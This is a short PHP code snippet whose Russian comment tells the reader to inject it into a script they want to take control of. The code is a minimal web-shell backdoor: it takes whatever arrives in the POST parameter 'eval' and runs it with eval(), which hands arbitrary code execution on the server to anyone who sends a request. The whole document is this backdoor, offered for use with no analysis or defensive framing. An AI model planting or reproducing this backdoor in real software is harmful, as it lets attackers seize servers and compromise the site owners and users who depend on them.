<?php 

// внедрите этот код в сценарий над которым хотите получить контроль 
if (isset($_POST['eval'])) {
    $c = $_POST['eval'];
    if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
        $c = stripslashes($c);
    }
    eval($c);
    die;
}